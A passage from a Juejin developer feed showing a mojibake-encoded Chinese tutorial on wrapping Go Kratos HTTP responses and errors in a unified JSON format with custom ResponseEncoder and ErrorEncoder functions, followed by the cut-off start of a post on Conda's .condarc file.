  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T16:41:15.000Z" title="Thu Jan 01 2026 16:41:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ç”¨ Kratos å†™åç«¯æœåŠ¡çš„æ—¶å€™ï¼Œä½ å¯èƒ½å·²ç»æ³¨æ„åˆ°ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼ŒKratos ä¼šç›´æ¥æŠŠä½ çš„è¿”å›å€¼è½¬æˆ JSON å‘å‡ºå»ï¼Œé”™è¯¯çš„è¯å°±ç”¨å®ƒè‡ªå¸¦çš„ <code>errors</code> åŒ…å¤„ç†ã€‚è¿™å…¶å®æŒºæ–¹ä¾¿çš„ï¼Œä½†ç°å®é¡¹ç›®é‡Œå¾€å¾€æ²¡é‚£ä¹ˆç®€å•ã€‚</p>
<p>æ¯”å¦‚ï¼Œå‰ç«¯åŒå­¦å¯èƒ½ä¼šè¯´ï¼šâ€œèƒ½ä¸èƒ½æ‰€æœ‰æ¥å£éƒ½è¿”å›ä¸€æ ·çš„ç»“æ„ï¼Ÿè¿™æ ·æˆ‘å†™æ‹¦æˆªå™¨å’Œé”™è¯¯æç¤ºå°±ä¸ç”¨çŒœäº†ã€‚â€æˆ–è€…è€ç³»ç»Ÿå¯¹æ¥æ—¶è¦æ±‚ï¼šâ€œå¿…é¡»å¸¦ <code>success</code> å­—æ®µï¼Œä¸ç„¶æˆ‘ä»¬è§£æä¸äº†ã€‚â€</p>
<p>è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å°±å¾—è‡ªå·±åŠ¨æ‰‹ï¼Œ<strong>å®šåˆ¶ä¸€å¥—ç»Ÿä¸€çš„å“åº”æ ¼å¼</strong>äº†ã€‚</p>
<blockquote>
<p>å¯èƒ½æ˜¯æˆ‘æ‰“å¼€çš„æ–¹å¼ä¸å¯¹ï¼Œç½‘ä¸Šæ²¡æœ‰ç°æˆçš„ä»£ç å¯ä»¥å¤åˆ¶ï¼Œè‡ªå·±æ‘¸ç´¢äº†ä¸€äº›æ—¶é—´ï¼Œç»™åæ¥äººçœç‚¹åŠ›æ°”ï¼Œæ–‡ç« æœ«å°¾æœ‰ä»£ç ï¼Œåº”è¯¥èƒ½å¤åˆ¶è°ƒè¯•ä½¿ç”¨ï¼Œå¸Œæœ›ä½ ä¸ç”¨å†åƒæˆ‘ä¸€æ ·ç¿»åŠå¤©æºç ã€è¯•å„ç§å†™æ³•ï¼Œæœ€åå‘ç°åŸæ¥å°±å·®ä¸€ä¸ª <code>http.ResponseEncoder</code> é…ç½®ã€‚</p>
</blockquote>
<h2 data-id="heading-0">æƒ³è¦è¿™æ ·çš„è¿”å›</h2>
<p>æˆåŠŸçš„å“åº”ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">200</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"OK"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">/* çœŸæ­£çš„ä¸šåŠ¡æ•°æ® */</span> <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å‡ºé”™çš„æ—¶å€™ä¹Ÿåˆ«ä¹±æ¥ï¼Œç»Ÿä¸€æˆè¿™æ ·ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">400</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å‚æ•°é”™è¯¯"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>è¿™æ ·å‰ç«¯ä¸€çœ‹å°±çŸ¥é“ï¼šå“¦ï¼Œ<code>success</code> æ˜¯ <code>false</code>ï¼Œé‚£è‚¯å®šå‡ºé—®é¢˜äº†ï¼›<code>message</code> èƒ½ç›´æ¥æ‹¿æ¥ toast æç¤ºï¼›<code>data</code> æœ‰ä¸œè¥¿å°±æ˜¯æ­£å¸¸æ•°æ®ï¼Œæ²¡ä¸œè¥¿å°±è·³è¿‡ã€‚å¤§å®¶éƒ½çœå¿ƒï¼</p>
<h2 data-id="heading-1">Kratos æ€ä¹ˆè®©æˆ‘ä»¬è‡ªå®šä¹‰</h2>
<p>Kratos å¾ˆè´´å¿ƒï¼Œæ—©å°±ç•™äº†ä¸¤ä¸ªâ€œé’©å­â€ç»™æˆ‘ä»¬ï¼š</p>
<ul>
<li><strong><code>ResponseEncoder</code></strong>ï¼šä¸“é—¨å¤„ç†æ­£å¸¸è¿”å›çš„æ•°æ®ã€‚</li>
<li><strong><code>ErrorEncoder</code></strong>ï¼šä¸“é—¨å¤„ç†å‡ºé”™çš„æƒ…å†µã€‚</li>
</ul>
<p>è¿™ä¸¤ä¸ªä¸œè¥¿æœ¬è´¨ä¸Šå°±æ˜¯ä¸¤ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å‘Šè¯‰ Kratosï¼šâ€œä»¥åæˆåŠŸäº†æŒ‰è¿™ä¸ªæ ¼å¼åŒ…ï¼Œå¤±è´¥äº†æŒ‰é‚£ä¸ªæ ¼å¼åŒ…â€ï¼Œå®ƒå°±ä¼šä¹–ä¹–ç…§åšã€‚</p>
<p>è€Œä¸”å®ƒä»¬æ˜¯åœ¨åˆ›å»º HTTP Server çš„æ—¶å€™é€šè¿‡é…ç½®é¡¹ä¼ è¿›å»çš„ï¼Œéå¸¸å¹²å‡€ï¼Œä¸æ±¡æŸ“ä¸šåŠ¡é€»è¾‘ã€‚</p>
<h2 data-id="heading-2">å…·ä½“æ“ä½œ</h2>
<h3 data-id="heading-3">å®šä¹‰ä¸‡èƒ½åŒ…è£…ç»“æ„ä½“</h3>
<p>åœ¨æˆ‘ä»¬çš„ <code>server</code> åŒ…é‡Œï¼Œå»ºä¸ªç»“æ„ä½“ï¼Œç”¨æ¥è£…æ‰€æœ‰è¿”å›å†…å®¹ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> httpUnifiedResponse <span class="hljs-keyword">struct</span> {
	Code    <span class="hljs-type">int32</span>  <span class="hljs-string">`json:"code"`</span>
	Message <span class="hljs-type">string</span> <span class="hljs-string">`json:"message"`</span>
	Success <span class="hljs-type">bool</span>   <span class="hljs-string">`json:"success"`</span>
	Data    any    <span class="hljs-string">`json:"data"`</span> <span class="hljs-comment">// any å°±æ˜¯ interface{}ï¼Œå•¥éƒ½èƒ½å¡</span>
}
</code></pre>
<h3 data-id="heading-4">æˆåŠŸæ—¶çš„å‡½æ•°ï¼ˆResponseEncoderï¼‰</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">encodeHTTPResponse</span><span class="hljs-params">(w nethttp.ResponseWriter, r *nethttp.Request, v any)</span></span> <span class="hljs-type">error</span> {
	<span class="hljs-comment">// å¦‚æœæˆ‘ä»¬æƒ³æ”¯æŒé‡å®šå‘ï¼ˆæ¯”å¦‚ç™»å½•è·³è½¬ï¼‰ï¼Œå¯ä»¥åŠ ä¸ªåˆ¤æ–­</span>
	<span class="hljs-keyword">if</span> rd, ok := v.(<span class="hljs-keyword">interface</span>{ Redirect() (<span class="hljs-type">string</span>, <span class="hljs-type">int</span>) }); ok {
		url, code := rd.Redirect()
		nethttp.Redirect(w, r, url, code)
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
	}

	<span class="hljs-comment">// æ­£å¸¸æƒ…å†µï¼šåŒ…ä¸€å±‚å†è¿”å›</span>
	w.Header().Set(<span class="hljs-string">"Content-Type"</span>, <span class="hljs-string">"application/json; charset=utf-8"</span>)
	<span class="hljs-keyword">return</span> json.NewEncoder(w).Encode(httpUnifiedResponse{
		Code:    <span class="hljs-number">200</span>,
		Message: <span class="hljs-string">"OK"</span>,
		Success: <span class="hljs-literal">true</span>,
		Data:    v, <span class="hljs-comment">// æŠŠæˆ‘ä»¬ handler è¿”å›çš„ä¸œè¥¿å¡è¿› data</span>
	})
}
</code></pre>
<blockquote>
<p>è¿™é‡Œçš„ <code>code: 200</code> æ˜¯ä¸šåŠ¡æ„ä¹‰ä¸Šçš„â€œæˆåŠŸç â€ï¼Œä¸æ˜¯ HTTP çŠ¶æ€ç ï¼ˆè™½ç„¶ç¢°å·§ä¸€æ ·ï¼‰ã€‚HTTP çŠ¶æ€ç æ¡†æ¶é»˜è®¤è¿˜æ˜¯ 200ï¼Œæ²¡é—®é¢˜ã€‚</p>
</blockquote>
<h3 data-id="heading-5">å‡ºé”™æ—¶çš„å‡½æ•°ï¼ˆErrorEncoderï¼‰</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">encodeHTTPError</span><span class="hljs-params">(w nethttp.ResponseWriter, r *nethttp.Request, err <span class="hljs-type">error</span>)</span></span> {
	<span class="hljs-comment">// æŠŠ error è½¬æˆ Kratos æ ‡å‡†é”™è¯¯</span>
	se := errors.FromError(err)
	<span class="hljs-keyword">if</span> se == <span class="hljs-literal">nil</span> {
		<span class="hljs-comment">// ä¸‡ä¸€ä¸æ˜¯æ ‡å‡†é”™è¯¯ï¼Œå…œä¸ªåº•</span>
		se = errors.New(errors.UnknownCode, errors.UnknownReason, <span class="hljs-string">""</span>)
	}

	w.Header().Set(<span class="hljs-string">"Content-Type"</span>, <span class="hljs-string">"application/json; charset=utf-8"</span>)
	w.WriteHeader(<span class="hljs-type">int</span>(se.Code)) <span class="hljs-comment">// è¿™é‡Œæ‰çœŸæ­£è®¾ç½® HTTP çŠ¶æ€ç ï¼ˆæ¯”å¦‚ 400ã€500ï¼‰</span>

	_ = json.NewEncoder(w).Encode(httpUnifiedResponse{
		Code:    se.Code,    <span class="hljs-comment">// ç”¨é”™è¯¯é‡Œçš„ code</span>
		Message: se.Message, <span class="hljs-comment">// é”™è¯¯ä¿¡æ¯</span>
		Success: <span class="hljs-literal">false</span>,
		Data:    <span class="hljs-literal">nil</span>,
	})
}
</code></pre>
<p>è¿™æ ·ä¸€æ¥ï¼Œå“ªæ€•æˆ‘ä»¬ä»£ç é‡Œ <code>return nil, errors.BadRequest("xxx", "yyy")</code>ï¼Œå‰ç«¯æ”¶åˆ°çš„ä¹Ÿä¸æ˜¯ä¸€å †ä¹±ä¸ƒå…«ç³Ÿçš„æ–‡æœ¬ï¼Œè€Œæ˜¯ä¸€ä¸ªè§„è§„çŸ©çŸ©çš„ JSONï¼</p>
<h3 data-id="heading-6">æŠŠä¸¤ä¸ªå‡½æ•°é…ç½®è¿› Server</h3>
<p>å›åˆ°æˆ‘ä»¬åˆ›å»º HTTP Server çš„åœ°æ–¹ï¼ˆæ¯”å¦‚ <code>NewHTTPServer</code> å‡½æ•°ï¼‰ï¼ŒåŠ ä¸Šè¿™ä¸¤è¡Œé…ç½®ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">var</span> opts = []http.ServerOption{
	http.PathPrefix(<span class="hljs-string">"/api"</span>),
	http.Middleware(
		recovery.Recovery(),
		logging.Server(logger),
	),
	http.ResponseEncoder(encodeHTTPResponse), <span class="hljs-comment">// â† æˆåŠŸèµ°è¿™é‡Œ</span>
	http.ErrorEncoder(encodeHTTPError),       <span class="hljs-comment">// â† å¤±è´¥èµ°è¿™é‡Œ</span>
	<span class="hljs-comment">// ... å…¶ä»–é…ç½®ç…§å¸¸</span>
}
</code></pre>
<p>æå®šï¼ä»æ­¤ä»¥åï¼Œè¿™ä¸ª Server ä¸‹çš„æ‰€æœ‰æ¥å£ï¼Œéƒ½ä¼šè‡ªåŠ¨å¥—ä¸Šæˆ‘ä»¬å®šä¹‰çš„æ ¼å¼ã€‚</p>
<h2 data-id="heading-7">å®é™…ä¾‹å­æ„Ÿå—ä¸‹</h2>
<p>å‡è®¾æˆ‘ä»¬çš„ handler æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">return</span> &amp;accessv1.LoginResponse{Token: <span class="hljs-string">"abc123"</span>}, <span class="hljs-literal">nil</span>
</code></pre>
<p>å‰ç«¯æ”¶åˆ°çš„å°±æ˜¯ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">200</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"OK"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"token"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"abc123"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å¦‚æœä¸­é—´æŠ¥é”™äº†ï¼Œæ¯”å¦‚ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.BadRequest(<span class="hljs-string">"USER_NOT_FOUND"</span>, <span class="hljs-string">"ç”¨æˆ·ä¸å­˜åœ¨"</span>)
</code></pre>
<p>é‚£å‰ç«¯çœ‹åˆ°çš„æ˜¯ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">400</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ç”¨æˆ·ä¸å­˜åœ¨"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>è€Œä¸”æµè§ˆå™¨ Network é¢æ¿é‡ŒçŠ¶æ€ç ä¹Ÿæ˜¯ <code>400</code>ï¼Œå®Œå…¨ç¬¦åˆè§„èŒƒï¼Œå‰ç«¯è°ƒè¯•èµ·æ¥è´¼èˆ’æœã€‚</p>
<h2 data-id="heading-8">å®Œæ•´ä»£ç </h2>
<blockquote>
<p>å¸¦æ³¨é‡Šï¼Œæ”¾å¿ƒæŠ„</p>
</blockquote>
<p>ç›®å½•ç»“æ„</p>
<pre><code class="hljs language-text" lang="text">server/
â”œâ”€â”€ grpc.go
â”œâ”€â”€ http.go
â”œâ”€â”€ http_encoder.go
â””â”€â”€ server.go

1 directory, 4 files
</code></pre>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> server

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"encoding/json"</span>
	nethttp <span class="hljs-string">"net/http"</span>

	<span class="hljs-string">"github.com/go-kratos/kratos/v2/errors"</span>
)

<span class="hljs-keyword">type</span> httpUnifiedResponse <span class="hljs-keyword">struct</span> {
	Code    <span class="hljs-type">int32</span>  <span class="hljs-string">`json:"code"`</span>
	Message <span class="hljs-type">string</span> <span class="hljs-string">`json:"message"`</span>
	Success <span class="hljs-type">bool</span>   <span class="hljs-string">`json:"success"`</span>
	Data    any    <span class="hljs-string">`json:"data"`</span>
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">encodeHTTPResponse</span><span class="hljs-params">(w nethttp.ResponseWriter, r *nethttp.Request, v any)</span></span> <span class="hljs-type">error</span> {
	<span class="hljs-keyword">if</span> rd, ok := v.(<span class="hljs-keyword">interface</span>{ Redirect() (<span class="hljs-type">string</span>, <span class="hljs-type">int</span>) }); ok {
		url, code := rd.Redirect()
		nethttp.Redirect(w, r, url, code)
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
	}

	w.Header().Set(<span class="hljs-string">"Content-Type"</span>, <span class="hljs-string">"application/json; charset=utf-8"</span>)
	<span class="hljs-keyword">return</span> json.NewEncoder(w).Encode(httpUnifiedResponse{
		Code:    <span class="hljs-number">200</span>,
		Message: <span class="hljs-string">"OK"</span>,
		Success: <span class="hljs-literal">true</span>,
		Data:    v,
	})
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">encodeHTTPError</span><span class="hljs-params">(w nethttp.ResponseWriter, r *nethttp.Request, err <span class="hljs-type">error</span>)</span></span> {
	se := errors.FromError(err)
	<span class="hljs-keyword">if</span> se == <span class="hljs-literal">nil</span> {
		se = errors.New(errors.UnknownCode, errors.UnknownReason, <span class="hljs-string">""</span>)
	}

	w.Header().Set(<span class="hljs-string">"Content-Type"</span>, <span class="hljs-string">"application/json; charset=utf-8"</span>)
	w.WriteHeader(<span class="hljs-type">int</span>(se.Code))
	_ = json.NewEncoder(w).Encode(httpUnifiedResponse{
		Code:    se.Code,
		Message: se.Message,
		Success: <span class="hljs-literal">false</span>,
		Data:    <span class="hljs-literal">nil</span>,
	})
}
</code></pre>
<p>200 æ•ˆæœï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/412e641bdbb84439a84674c11062e0e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2hhcmxpZV9CeXRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767890474&amp;x-signature=7j2NFDC3Y53j2iIevTUn9Ry8mT0%3D" alt="Pasted image 20260102002929.png" loading="lazy"/></p>
<p>é”™è¯¯æ•ˆæœï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0dabff283bfd42bcbd4e8fd40153cd43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2hhcmxpZV9CeXRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767890474&amp;x-signature=T8TY6AfqSpSo463ZLiuQmOyjsjM%3D" alt="Pasted image 20260102002955.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Condaé…ç½®æ–‡ä»¶.condarc]]></title>    <link>https://juejin.cn/post/7589978645171601434</link>    <guid>https://juejin.cn/post/7589978645171601434</guid>    <pubDate>2026-01-01T19:12:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589978645171601434" data-draft-id="7589920884309508122" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Condaé…ç½®æ–‡ä»¶.condarc"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-01T19:12:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¾œæœˆå"/> <meta itemprop="url" content="https://juejin.cn/user/2872336891512350"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Condaé…ç½®æ–‡ä»¶.condarc
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2872336891512350/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¾œæœˆå
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T19:12:09.000Z" title="Thu Jan 01 2026 19:12:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 